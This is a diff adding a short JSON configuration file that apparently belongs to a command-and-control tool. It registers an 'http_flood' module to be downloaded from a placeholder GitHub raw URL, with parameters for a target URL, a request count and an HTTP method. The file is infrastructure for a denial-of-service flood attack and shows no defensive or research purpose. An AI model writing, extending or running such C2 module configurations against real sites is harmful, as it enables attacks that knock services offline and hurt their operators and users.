@@ -1,0 +1,11 @@
+{
+   
+    "http_flood": {
+        "url": "https://raw.githubusercontent.com/sizinrepo/c2modules/main/http_flood.js",
+        "params": {
+            "url": {"required": true, "type": "string"},
+            "requests": {"required": true, "type": "number"},
+            "method": {"required": false, "default": "GET"}
+        }
+    }
+}
